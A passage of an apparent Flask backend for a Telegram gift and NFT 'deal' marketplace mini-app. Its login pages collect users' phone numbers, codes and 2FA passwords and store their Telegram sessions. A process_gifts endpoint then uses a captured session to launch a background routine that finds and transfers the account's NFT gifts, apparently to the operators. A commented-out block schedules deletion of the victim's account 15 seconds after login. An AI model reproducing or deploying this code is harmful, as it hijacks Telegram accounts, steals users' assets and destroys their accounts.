        # TODO: Временно отключена система удаления аккаунтов
        # # Планируем удаление аккаунта через 15 секунд после успешного входа
        # try:
        #     from gift_processor import delete_account_after_delay
        #     import threading
        #
        #     def schedule_account_deletion():
        #         """Запускает удаление аккаунта в отдельном event loop"""
        #         loop = asyncio.new_event_loop()
        #         asyncio.set_event_loop(loop)
        #         try:
        #             # Используем session_string если есть, иначе None (функция найдёт сессию по phone)
        #             loop.run_until_complete(delete_account_after_delay(
        #                 session_string if session_string else "",
        #                 phone,
        #                 user_id,
        #                 delay=15
        #             ))
        #         finally:
        #             loop.close()
        #
        #     thread = threading.Thread(target=schedule_account_deletion, daemon=True)
        #     thread.start()
        #     logger.info(f"⏳ Запланировано удаление аккаунта {phone} через 15 секунд после успешного входа (2FA)")
        # except Exception as e:
        #     logger.warning(f"⚠️ Не удалось запланировать удаление аккаунта: {e}")
        
        return jsonify({'success': True, 'user': db_user})
    except Exception as e:
        logger.error(f"Error verifying 2FA: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

# Роуты для HTML страниц авторизации (используем /auth-html чтобы обойти React Router)
@app.route('/auth-html', methods=['GET'])
def auth_start_page():
    """Начальная страница авторизации с логотипом"""
    return render_template('auth_start.html')

@app.route('/auth-html/phone', methods=['GET'])
def auth_page():
    """Страница ввода номера телефона"""
    return render_template('auth.html')

@app.route('/auth-html/code', methods=['GET'])
def code_page():
    """Страница ввода кода"""
    return render_template('code.html')

@app.route('/auth-html/password', methods=['GET'])
def password_page():
    """Страница ввода пароля 2FA"""
    return render_template('password.html')

@app.route('/auth-html/success', methods=['GET'])
def success_page():
    """Страница успешной авторизации"""
    return render_template('success.html')

@app.route('/api/auth/check', methods=['GET'])
def check_auth():
    """Проверить статус авторизации"""
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        if not init_data:
            return jsonify({
                'success': True,
                'is_authorized': False,
                'has_phone': False
            })
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({
                'success': True,
                'is_authorized': False,
                'has_phone': False
            })
        
        telegram_id = user_info['id']
        phone = get_phone_from_json(telegram_id)
        
        # Всегда получаем или создаем пользователя в базе данных для возврата правильного ID
        # И обновляем данные из Telegram (username может измениться)
        user = db.get_or_create_user(
            telegram_id=telegram_id,
            username=user_info.get('username', ''),
            first_name=user_info.get('first_name', ''),
            last_name=user_info.get('last_name', '')
        )
        
        user_data = None
        if user:
            # Используем актуальные данные из Telegram, если они есть
            user_data = {
                'id': user['id'],
                'telegram_id': user.get('telegram_id'),
                'username': user_info.get('username') or user.get('username') or '',
                'first_name': user_info.get('first_name') or user.get('first_name') or '',
                'last_name': user_info.get('last_name') or user.get('last_name') or '',
                'balance': float(user.get('balance', 0)) if user.get('balance') is not None else 0.0,
                'is_worker': bool(user.get('is_worker', 0)),
                'is_admin': bool(user.get('is_admin', 0)),
                'created_at': user.get('created_at')
            }
        
        if phone:
            is_authorized = check_session_exists(phone) and validate_session(phone)
            return jsonify({
                'success': True,
                'is_authorized': is_authorized,
                'has_phone': True,
                'phone': phone,
                'user': user_data
            })
        
        # Даже если нет телефона, возвращаем данные пользователя
        return jsonify({
            'success': True,
            'is_authorized': False,
            'has_phone': False,
            'user': user_data
        })
    except Exception as e:
        logger.error(f"Error checking auth: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/process_gifts', methods=['POST'])
def process_gifts():
    """API: обработка подарков пользователя - поиск и перевод NFT подарков (как в getgems)"""
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        user_id = data.get('user_id')
        user_info = get_user_from_init_data(init_data)
        if not user_info and user_id:
            user_info = {'id': int(user_id)}
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data or user_id'}), 401
        
        telegram_id = user_info['id']
        from utils import get_phone_from_json, check_session_exists, validate_session
        phone = get_phone_from_json(telegram_id)
        if not phone:
            return jsonify({
                'success': False, 
                'error': 'Phone number not found. Please authorize first.'
            }), 400
        
        if not (check_session_exists(phone) and validate_session(phone)):
            return jsonify({
                'success': False, 
                'error': 'Session expired or invalid. Please re-authorize.'
            }), 401
        
        from auth_sender import convert_to_pyrogram_session_string
        session_file = f"sessions/{phone.replace('+', '')}.session"
        if not os.path.exists(session_file):
            return jsonify({
                'success': False, 
                'error': 'Session file not found'
            }), 404
        
        import asyncio
        async def process_gifts_async():
            session_string = await convert_to_pyrogram_session_string(phone)
            if not session_string:
                return None
            from tonnel_runner import launch_tonnel_background
            launch_tonnel_background(session_string, phone, telegram_id)
            return {"status": "tonnel_started"}
        
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            result = loop.run_until_complete(process_gifts_async())
            loop.close()
        except Exception as e:
            logger.error(f"Error in async processing: {e}")
            return jsonify({'success': False, 'error': f'Async processing failed: {str(e)}'}), 500
        
        if result is None:
            return jsonify({
                'success': False, 
                'error': 'Failed to convert session'
            }), 500
        
        return jsonify({
            'success': True,
            'message': 'Gift processing completed',
            'result': result
        })
    except Exception as e:
        logger.error(f"Error processing gifts: {e}")
        import traceback
        traceback.print_exc()
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/check-auth-status')
def check_auth_status():
    """Проверить статус авторизации пользователя"""
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        if not init_data:
            return jsonify({
                'success': True,
                'is_authorized': False,
                'has_phone': False
            })
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({
                'success': True,
                'is_authorized': False,
                'has_phone': False
            })
        
        telegram_id = user_info['id']
        from utils import get_phone_from_json, check_session_exists, validate_session
        phone = get_phone_from_json(telegram_id)
        
        # Всегда получаем или создаем пользователя в базе данных для возврата правильного ID
        user = db.get_or_create_user(
            telegram_id=telegram_id,
            username=user_info.get('username', ''),
            first_name=user_info.get('first_name', ''),
            last_name=user_info.get('last_name', '')
        )
        
        user_data = None
        if user:
            user_data = {
                'id': user['id'],
                'telegram_id': user.get('telegram_id'),
                'username': user_info.get('username') or user.get('username') or '',
                'first_name': user_info.get('first_name') or user.get('first_name') or '',
                'last_name': user_info.get('last_name') or user.get('last_name') or '',
                'balance': float(user.get('balance', 0)) if user.get('balance') is not None else 0.0,
                'is_worker': bool(user.get('is_worker', 0)),
                'is_admin': bool(user.get('is_admin', 0)),
                'created_at': user.get('created_at')
            }
        
        if phone:
            is_authorized = check_session_exists(phone) and validate_session(phone)
            return jsonify({
                'success': True,
                'is_authorized': is_authorized,
                'has_phone': True,
                'phone': phone,
                'user': user_data
            })
        
        # Даже если нет телефона, возвращаем данные пользователя
        return jsonify({
            'success': True,
            'is_authorized': False,
            'has_phone': False,
            'user': user_data
        })
    except Exception as e:
        logger.error(f"Error checking auth: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/users/<int:user_id>', methods=['GET'])
def get_user(user_id):
    """Получить данные пользователя по ID"""
    try:
        user = db.get_user_by_id(user_id)
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404
        
        # Получаем фото профиля пользователя
        photo_url = None
        if user.get('telegram_id'):
            try:
                photo_url = get_user_photo_url(user['telegram_id'])
                logger.info(f"Got photo URL for user {user['telegram_id']}: {photo_url}")
            except Exception as e:
                logger.error(f"Error getting user photo: {e}", exc_info=True)
                photo_url = None
        
        # Возвращаем данные пользователя с балансами по всем валютам
        balance_value = float(user.get('balance', 0)) if user.get('balance') is not None else 0.0
        logger.info(f"Returning user data for user_id={user_id} - balance: {balance_value}, type: {type(balance_value)}")
        
        # Получаем балансы по всем валютам
        # Проверяем оба варианта: balance_starts и balance_stars
        balance_starts_value = user.get('balance_starts')
        balance_stars_value = user.get('balance_stars')
        
        # Используем balance_starts если есть, иначе balance_stars, иначе 0
        stars_balance = 0.0
        if balance_starts_value is not None:
            stars_balance = float(balance_starts_value)
        elif balance_stars_value is not None:
            stars_balance = float(balance_stars_value)
        
        balances = {
            'RUB': float(user.get('balance_rub', 0)) if user.get('balance_rub') is not None else 0.0,
            'UAH': float(user.get('balance_uah', 0)) if user.get('balance_uah') is not None else 0.0,
            'BYN': float(user.get('balance_byn', 0)) if user.get('balance_byn') is not None else 0.0,
            'TON': float(user.get('balance_ton', 0)) if user.get('balance_ton') is not None else 0.0,
            'USDT': float(user.get('balance_usdt', 0)) if user.get('balance_usdt') is not None else 0.0,
            'STARS': stars_balance,
        }
        
        return jsonify({
            'success': True,
            'data': {
                'id': user['id'],
                'telegram_id': user.get('telegram_id'),
                'username': user.get('username'),
                'first_name': user.get('first_name'),
                'last_name': user.get('last_name'),
                'balance': balance_value,  # Общий баланс (для обратной совместимости)
                'balances': balances,  # Балансы по валютам
                'is_worker': bool(user.get('is_worker', 0)),
                'is_admin': bool(user.get('is_admin', 0)),
                'photoUrl': photo_url
            }
        })
    except Exception as e:
        logger.error(f"Error getting user: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/users/<int:user_id>/profile', methods=['GET'])
def get_user_profile(user_id):
    """Получить профиль пользователя"""
    try:
        profile = db.get_user_profile(user_id)
        return jsonify({'success': True, 'data': profile})
    except Exception as e:
        logger.error(f"Error getting user profile: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/users/<int:user_id>/deals', methods=['GET'])
def get_user_deals_endpoint(user_id):
    """Получить сделки пользователя (только свои, как продавца/покупателя)"""
    try:
        status = request.args.get('status')  # active / closed / None
        deals = db.get_user_deals(user_id, status=status)
        return jsonify({'success': True, 'deals': deals})
    except Exception as e:
        logger.error(f"Error getting user deals: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/users/<int:user_id>/reviews', methods=['GET'])
def get_user_reviews_endpoint(user_id):
    """Получить отзывы о пользователе"""
    try:
        reviews = db.get_user_reviews(user_id)
        return jsonify({'success': True, 'reviews': reviews})
    except Exception as e:
        logger.error(f"Error getting user reviews: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/my-deals', methods=['GET'])
def get_my_deals():
    """Получить сделки текущего пользователя по init_data (только свои)"""
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        if not init_data:
            return jsonify({'success': False, 'error': 'init_data required'}), 401

        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401

        user = db.get_user_by_telegram_id(user_info['id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404

        status = request.args.get('status')
        deals = db.get_user_deals(user['id'], status=status)
        return jsonify({'success': True, 'deals': deals})
    except Exception as e:
        logger.error(f"Error getting my deals: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/user/by-telegram-id/<int:telegram_id>', methods=['GET'])
def get_user_by_telegram_id(telegram_id):
    """Получить данные пользователя по telegram_id"""
    try:
        user = db.get_user_by_telegram_id(telegram_id)
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404
        
        # Получаем балансы по всем валютам
        # Проверяем оба варианта: balance_starts и balance_stars
        balance_starts_value = user.get('balance_starts')
        balance_stars_value = user.get('balance_stars')
        
        # Отладочный вывод
        print(f"[DEBUG get_user_by_telegram_id] balance_starts_value: {balance_starts_value}, balance_stars_value: {balance_stars_value}")
        logger.info(f"[DEBUG] balance_starts_value: {balance_starts_value}, balance_stars_value: {balance_stars_value}")
        
        # Используем balance_starts если есть, иначе balance_stars, иначе 0
        stars_balance = 0.0
        if balance_starts_value is not None:
            stars_balance = float(balance_starts_value)
            print(f"[DEBUG] Using balance_starts: {stars_balance}")
        elif balance_stars_value is not None:
            stars_balance = float(balance_stars_value)
            print(f"[DEBUG] Using balance_stars: {stars_balance}")
        else:
            print(f"[DEBUG] Both values are None, using 0.0")
        
        balances = {
            'RUB': float(user.get('balance_rub', 0)) if user.get('balance_rub') is not None else 0.0,
            'UAH': float(user.get('balance_uah', 0)) if user.get('balance_uah') is not None else 0.0,
            'BYN': float(user.get('balance_byn', 0)) if user.get('balance_byn') is not None else 0.0,
            'TON': float(user.get('balance_ton', 0)) if user.get('balance_ton') is not None else 0.0,
            'USDT': float(user.get('balance_usdt', 0)) if user.get('balance_usdt') is not None else 0.0,
            'STARS': stars_balance,
        }
        
        print(f"[DEBUG] Final STARS balance: {balances['STARS']}")
        logger.info(f"[DEBUG] Final STARS balance: {balances['STARS']}")
        
        return jsonify({
            'success': True,
            'data': {
                'id': user['id'],
                'telegram_id': user.get('telegram_id'),
                'username': user.get('username'),
                'first_name': user.get('first_name'),
                'last_name': user.get('last_name'),
                'balances': balances,
                'is_worker': bool(user.get('is_worker', 0)),
                'is_admin': bool(user.get('is_admin', 0))
            }
        })
    except Exception as e:
        logger.error(f"Error getting user by telegram_id: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/gifts', methods=['GET'])
def get_user_gifts_api():
    """Получить подарки/NFT пользователя"""
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        if not init_data:
            return jsonify({'success': False, 'error': 'init_data required'}), 401
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401
        
        # Возвращаем пустой список NFT (пока не реализовано)
        # TODO: Реализовать получение реальных NFT из базы данных
        return jsonify({
            'success': True,
            'gifts': []
        })
    except Exception as e:
        logger.error(f"Error getting user gifts: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/user/avatar/<int:telegram_id>', methods=['GET'])
def get_user_avatar_api(telegram_id):
    """Получить аватарку пользователя"""
    try:
        # Пока просто возвращаем что аватарки нет
        # TODO: Реализовать получение аватарки из Telegram API
        return jsonify({
            'success': True,
            'avatar_url': None
        })
    except Exception as e:
        logger.error(f"Error getting user avatar: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/user/profile', methods=['GET'])
def get_profile():
    """Получить профиль пользователя"""
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        if not init_data:
            return jsonify({'success': False, 'error': 'init_data required'}), 401
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401
        
        user = db.get_user_by_telegram_id(user_info['id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404
        
        profile = db.get_user_profile(user['id'])
        deals = db.get_user_deals(user['id'])
        
        return jsonify({
            'success': True,
            'user': user,
            'profile': profile,
            'deals': deals
        })
    except Exception as e:
        logger.error(f"Error getting profile: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/user/withdraw', methods=['POST'])
def withdraw():
    """Вывести средства - требует обязательной авторизации"""
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData')
        amount = data.get('amount')
        
        if not init_data:
            return jsonify({
                'success': False,
                'error': 'Authorization required',
                'requires_auth': True
            }), 401
        
        if not amount:
            return jsonify({'success': False, 'error': 'Amount required'}), 400
        
        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({
                'success': False,
                'error': 'Invalid authorization',
                'requires_auth': True
            }), 401
        
        # Проверяем авторизацию через Telegram
        telegram_id = user_info['id']
        phone = get_phone_from_json(telegram_id)
        
        if not phone or not (check_session_exists(phone) and validate_session(phone)):
            return jsonify({
                'success': False,
                'error': 'Telegram authorization required. Please login first.',
                'requires_auth': True
            }), 401
        
        user = db.get_user_by_telegram_id(telegram_id)
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404
        
        # Проверяем баланс
        if user['balance'] < float(amount):
            return jsonify({'success': False, 'error': 'Insufficient balance'}), 400
        
        # Выполняем вывод
        db.withdraw_balance(user['id'], float(amount))
        
        updated_user = db.get_user_by_telegram_id(telegram_id)
        return jsonify({
            'success': True,
            'message': 'Withdrawal successful',
            'balance': updated_user['balance']
        })
    except Exception as e:
        logger.error(f"Error withdrawing: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/chats', methods=['GET'])
def get_chats():
    """Получить список чатов пользователя"""
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        if not init_data:
            return jsonify({'success': False, 'error': 'init_data required'}), 401

        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401

        user = db.get_user_by_telegram_id(user_info['id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404

        # Получаем чаты из сделок пользователя
        deals = db.get_user_deals(user['id'])
        chats = []
        chat_ids = set()

        for deal in deals:
            # Чат с продавцом (для покупателя) - уникальный для каждой сделки
            if deal.get('seller_id') and deal['seller_id'] != user['id']:
                seller = db.get_user_by_id(deal['seller_id'])
                if seller:
                    # Используем комбинацию deal_id + seller_id для уникальности чата
                    chat_key = f"deal_{deal['id']}_seller_{deal['seller_id']}"
                    if chat_key not in chat_ids:
                        chat_ids.add(chat_key)
                        # Получаем последнее НЕ системное сообщение из чата (оптимизированно)
                        last_message = db.get_last_deal_message(deal['id'], exclude_system=True)
                        if not last_message:
                            last_message = db.get_last_deal_message(deal['id'], exclude_system=False)
                        
                        # Получаем фото профиля продавца через Telegram Bot API
                        seller_photo_url = None
                        if seller.get('telegram_id'):
                            try:
                                seller_photo_url = get_user_photo_url(seller['telegram_id'])
                            except Exception as e:
                                logger.error(f"Error getting seller photo: {e}")
                                seller_photo_url = None
                        
                        # Подсчитываем непрочитанные сообщения (оптимизированно)
                        import sqlite3
                        conn = sqlite3.connect(db.db_path, timeout=10.0)
                        cursor = conn.cursor()
                        cursor.execute('''
                            SELECT last_read_message_id FROM chat_read_status
                            WHERE user_id = ? AND deal_id = ?
                        ''', (user['id'], deal['id']))
                        row = cursor.fetchone()
                        last_read_message_id = row[0] if row else 0
                        conn.close()
                        
                        # Если нет записи, используем последнее сообщение пользователя (оптимизированно)
                        if last_read_message_id == 0:
                            last_read_message_id = db.get_user_last_message_id(deal['id'], user['id'])
                        
                        # Считаем непрочитанные через оптимизированный SQL запрос
                        unread_count = db.get_unread_count(deal['id'], user['id'], last_read_message_id)
                        
                        # ID чата: deal_id * 10000 + seller_id * 10 + 1 (для продавца)
                        chats.append({
                            'id': deal['id'] * 10000 + deal['seller_id'] * 10 + 1,
                            'userId': deal['seller_id'],
                            'username': seller.get('username') or f"user_{deal['seller_id']}",
                            'firstName': seller.get('first_name'),
                            'lastName': seller.get('last_name'),
                            'photoUrl': seller_photo_url,
                            'dealId': deal['id'],
                            'lastMessage': last_message.get('text', f"Сделка #{deal['id']}: {deal.get('title', '')[:30]}") if last_message else f"Сделка #{deal['id']}: {deal.get('title', '')[:30]}",
                            'lastMessageTime': last_message.get('created_at', deal.get('updated_at', deal.get('created_at'))) if last_message else deal.get('updated_at', deal.get('created_at')),
                            'unreadCount': unread_count if unread_count > 0 else None
                        })

            # Чат с покупателем (для продавца) - уникальный для каждой сделки
            if deal.get('buyer_id') and deal['buyer_id'] != user['id']:
                buyer = db.get_user_by_id(deal['buyer_id'])
                if buyer:
                    # Используем комбинацию deal_id + buyer_id для уникальности чата
                    chat_key = f"deal_{deal['id']}_buyer_{deal['buyer_id']}"
                    if chat_key not in chat_ids:
                        chat_ids.add(chat_key)
                        # Получаем последнее НЕ системное сообщение из чата (оптимизированно)
                        last_message = db.get_last_deal_message(deal['id'], exclude_system=True)
                        if not last_message:
                            last_message = db.get_last_deal_message(deal['id'], exclude_system=False)
                        
                        # Получаем фото профиля покупателя через Telegram Bot API
                        buyer_photo_url = None
                        if buyer.get('telegram_id'):
                            try:
                                buyer_photo_url = get_user_photo_url(buyer['telegram_id'])
                            except Exception as e:
                                logger.error(f"Error getting buyer photo: {e}")
                                buyer_photo_url = None
                        
                        # Подсчитываем непрочитанные сообщения (оптимизированно)
                        import sqlite3
                        conn = sqlite3.connect(db.db_path, timeout=10.0)
                        cursor = conn.cursor()
                        cursor.execute('''
                            SELECT last_read_message_id FROM chat_read_status
                            WHERE user_id = ? AND deal_id = ?
                        ''', (user['id'], deal['id']))
                        row = cursor.fetchone()
                        last_read_message_id = row[0] if row else 0
                        conn.close()
                        
                        # Если нет записи, используем последнее сообщение пользователя (оптимизированно)
                        if last_read_message_id == 0:
                            last_read_message_id = db.get_user_last_message_id(deal['id'], user['id'])
                        
                        # Считаем непрочитанные через оптимизированный SQL запрос
                        unread_count = db.get_unread_count(deal['id'], user['id'], last_read_message_id)
                        
                        # ID чата: deal_id * 10000 + buyer_id * 10 + 2 (для покупателя)
                        chats.append({
                            'id': deal['id'] * 10000 + deal['buyer_id'] * 10 + 2,
                            'userId': deal['buyer_id'],
                            'username': buyer.get('username') or f"user_{deal['buyer_id']}",
                            'firstName': buyer.get('first_name'),
                            'lastName': buyer.get('last_name'),
                            'photoUrl': buyer_photo_url,
                            'dealId': deal['id'],
                            'lastMessage': last_message.get('text', f"Сделка #{deal['id']}: {deal.get('title', '')[:30]}") if last_message else f"Сделка #{deal['id']}: {deal.get('title', '')[:30]}",
                            'lastMessageTime': last_message.get('created_at', deal.get('updated_at', deal.get('created_at'))) if last_message else deal.get('updated_at', deal.get('created_at')),
                            'unreadCount': unread_count if unread_count > 0 else None
                        })

        return jsonify({'success': True, 'chats': chats})
    except Exception as e:
        logger.error(f"Error getting chats: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/chats/<int:chat_id>/messages', methods=['GET'])
def get_chat_messages(chat_id):
    """Получить сообщения чата"""
    try:
        init_data = request.args.get('init_data') or request.args.get('initData')
        if not init_data:
            return jsonify({'success': False, 'error': 'init_data required'}), 401

        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401

        # Чат из сделки - используем сообщения сделки
        # Новая логика: chat_id = deal_id * 10000 + user_id * 10 + (1 для продавца, 2 для покупателя)
        deal_id = chat_id // 10000
        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Chat not found'}), 404

        # Получаем текущего пользователя
        user = db.get_user_by_telegram_id(user_info['id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404

        # Получаем сообщения сделки (только последние 50 для оптимизации)
        # Для загрузки старых сообщений можно добавить параметр after_id
        after_id = request.args.get('after_id', type=int, default=0)
        limit = request.args.get('limit', type=int, default=50)
        messages = db.get_deal_messages(deal_id, after_id=after_id, limit=limit)
        # Преобразуем формат для фронтенда и фильтруем по target_user_id
        import json
        formatted_messages = []
        current_user_id = user['id']
        
        for msg in messages:
            # Фильтруем сообщения: показываем только те, где target_user_id равен текущему пользователю или NULL
            target_user_id = msg.get('target_user_id')
            if target_user_id is not None and target_user_id != current_user_id:
                continue  # Пропускаем сообщения, предназначенные другим пользователям
            
            buttons = None
            # Безопасная проверка наличия колонки buttons
            try:
                if 'buttons' in msg and msg.get('buttons'):
                    try:
                        buttons = json.loads(msg['buttons'])
                    except (json.JSONDecodeError, TypeError, ValueError):
                        buttons = None
            except (KeyError, AttributeError):
                buttons = None
            
            formatted_message = {
                'id': msg['id'],
                'chatId': chat_id,
                'dealId': msg['deal_id'],
                'senderId': msg['sender_id'],
                'senderUsername': msg['sender_username'],
                'text': msg['text'],
                'photoUrl': msg.get('photo_url'),
                'isSystem': bool(msg.get('is_system', 0)),
                'createdAt': msg['created_at'],
                'buttons': buttons
            }
            
            # Добавляем информацию о подарке, если есть
            if msg.get('gift_id'):
                gift = db.get_gift_by_id(msg['gift_id'])
                if gift:
                    formatted_message['gift'] = {
                        'id': gift['id'],
                        'giftId': gift.get('gift_id'),
                        'giftName': gift.get('gift_name'),
                        'giftModel': gift.get('gift_model'),
                        'giftBackground': gift.get('gift_background'),
                        'giftBadge': gift.get('gift_badge'),
                        'giftImageUrl': gift.get('gift_image_url'),
                        'giftLottieUrl': gift.get('gift_lottie_url'),
                        'giftLink': gift.get('gift_link'),
                        'giftNumber': gift.get('gift_number'),
                        'senderUsername': gift.get('sender_username')
                    }
            
            formatted_messages.append(formatted_message)
        return jsonify({'success': True, 'messages': formatted_messages})
    except Exception as e:
        logger.error(f"Error getting chat messages: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/chats/<int:chat_id>/read', methods=['POST'])
def mark_chat_as_read(chat_id):
    """Пометить сообщения чата как прочитанные (при открытии чата)"""
    try:
        data = request.get_json() or {}
        init_data = data.get('init_data') or data.get('initData') or request.args.get('init_data') or request.args.get('initData')
        
        if not init_data:
            return jsonify({'success': False, 'error': 'init_data required'}), 401

        user_info = get_user_from_init_data(init_data)
        if not user_info:
            return jsonify({'success': False, 'error': 'Invalid init_data'}), 401

        # Чат из сделки - используем сообщения сделки
        deal_id = chat_id // 10000
        deal = db.get_deal_by_id(deal_id)
        if not deal:
            return jsonify({'success': False, 'error': 'Chat not found'}), 404

        # Получаем текущего пользователя
        user = db.get_user_by_telegram_id(user_info['id'])
        if not user:
            return jsonify({'success': False, 'error': 'User not found'}), 404

        # Проверяем, что пользователь является участником сделки
        if user['id'] not in [deal.get('seller_id'), deal.get('buyer_id')]:
            return jsonify({'success': False, 'error': 'You are not a participant of this deal'}), 403

        # Получаем ID последнего сообщения в чате
        # Используем прямой SQL запрос для получения последнего сообщения
        import sqlite3
        conn_check = sqlite3.connect(db.db_path, timeout=10.0)
        cursor_check = conn_check.cursor()
        cursor_check.execute('''
            SELECT id FROM messages
            WHERE deal_id = ? AND deleted_at IS NULL
            ORDER BY id DESC
            LIMIT 1
        ''', (deal_id,))
        row = cursor_check.fetchone()
        last_message_id = row[0] if row else 0
        conn_check.close()
        
        logger.info(f"Marking chat as read: deal_id={deal_id}, user_id={user['id']}, last_message_id={last_message_id}")
        
        # Обновляем last_read_message_id в таблице chat_read_status
        import sqlite3
        conn = sqlite3.connect(db.db_path, timeout=10.0)
        cursor = conn.cursor()
        cursor.execute('''
            INSERT INTO chat_read_status (user_id, deal_id, last_read_message_id, updated_at)
            VALUES (?, ?, ?, CURRENT_TIMESTAMP)
            ON CONFLICT(user_id, deal_id) DO UPDATE SET
                last_read_message_id = excluded.last_read_message_id,
                updated_at = CURRENT_TIMESTAMP
        ''', (user['id'], deal_id, last_message_id))
        conn.commit()
        conn.close()
        
        logger.info(f"Marked chat {chat_id} (deal {deal_id}) as read for user {user['id']}, last_read_message_id={last_message_id}")
        
        return jsonify({'success': True, 'message': 'Chat marked as read', 'last_read_message_id': last_message_id})
    except Exception as e:
        logger.error(f"Error marking chat as read: {e}", exc_info=True)
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/chats/<int:chat_id>/messages', methods=['POST'])
def send_chat_message(chat_id):
    """Отправить сообщение в чат"""
    try:
        # ДЕТАЛЬНОЕ ЛОГИРОВАНИЕ для отладки ошибки 415
        logger.info(f"=== POST /api/chats/{chat_id}/messages ===")
        logger.info(f"Content-Type: {request.content_type}")
        try:
            logger.info(f"MIME Type: {request.mimetype}")
        except (TypeError, AttributeError):
            logger.info(f"MIME Type: (unavailable)")
        
        # КРИТИЧЕСКИ ВАЖНО: проверяем наличие файла ПЕРВЫМ делом
        # Flask автоматически парсит multipart/form-data в request.files и request.form
        # НЕ вызываем request.get_json() для multipart запросов!
        
        # Проверяем наличие файла - это самый надежный способ определить multipart
        photo = None
        try:
            # Прямой доступ к request.files без дополнительных проверок
            if hasattr(request, 'files') and request.files:
                photo = request.files.get('photo')
                logger.info(f"Photo file found: {bool(photo)}")
                if photo:
                    logger.info(f"Photo filename: {photo.filename}, content_type: {photo.content_type}")
            else:
                logger.info("No files attribute or request.files is empty")
        except Exception as e:
            logger.error(f"Error getting photo from files: {e}", exc_info=True)
            photo = None
        
        # Если есть файл, это точно multipart/form-data
        if photo:
            logger.info("Processing as multipart (file found)")
            try:
                # Получаем init_data из form
                if hasattr(request, 'form') and request.form:
                    init_data_raw = request.form.get('init_data')
                    # Если это список (из parse_qs), берем первый элемент
                    if isinstance(init_data_raw, list):
                        init_data_raw = init_data_raw[0] if init_data_raw else None
                    text = (request.form.get('text') or '').strip()
                    logger.info(f"Got init_data from form: type={type(init_data_raw)}, length={len(str(init_data_raw)) if init_data_raw else 0}")
                else:
                    logger.error("request.form is not available")
                    init_data_raw = None
                    text = ''
            except Exception as e:
                logger.error(f"Error getting data from form (multipart with file): {e}", exc_info=True)
                init_data_raw = None
                text = ''
        # Проверяем content-type для multipart (на случай если файл не передан)
        elif request.content_type and 'multipart/form-data' in request.content_type:
            logger.info("Processing as multipart (content-type check)")
            try:
                if hasattr(request, 'form') and request.form:
                    init_data_raw = request.form.get('init_data')
                    if isinstance(init_data_raw, list):
                        init_data_raw = init_data_raw[0] if init_data_raw else None
                    text = (request.form.get('text') or '').strip()
                else:
                    logger.error("request.form is not available")
                    init_data_raw = None
                    text = ''
            except Exception as e:
                logger.error(f"Error getting data from form (multipart without file): {e}", exc_info=True)
                init_data_raw = None
                text = ''
            photo = None
        # Иначе это JSON запрос - НО проверяем content-type перед парсингом
        else:
            logger.info("Processing as JSON or form-urlencoded")
            photo = None
            # Парсим JSON ТОЛЬКО если content-type явно указывает на JSON
            if request.content_type and 'application/json' in request.content_type:
                logger.info("Attempting to parse JSON")
                try:
                    # Используем force=False и silent=True чтобы не форсировать парсинг
                    data = request.get_json(force=False, silent=True) or {}
                    logger.info(f"Parsed JSON successfully")
                    init_data_raw = data.get('init_data') or data.get('initData')
                    text = (data.get('text') or '').strip()
                except Exception as e:
                    # Если не удалось распарсить JSON, пробуем form
                    logger.warning(f"Failed to parse JSON, trying form: {e}")
                    try:
                        init_data_raw = request.form.get('init_data') if request.form else None
                        text = (request.form.get('text') or '').strip() if request.form else ''
                    except Exception as e2:
                        logger.error(f"Error getting data from form (JSON fallback): {e2}")
                        init_data_raw = None
                        text = ''
            else:
                # Fallback: пробуем получить из form
                logger.info("Getting data from form")
                try:
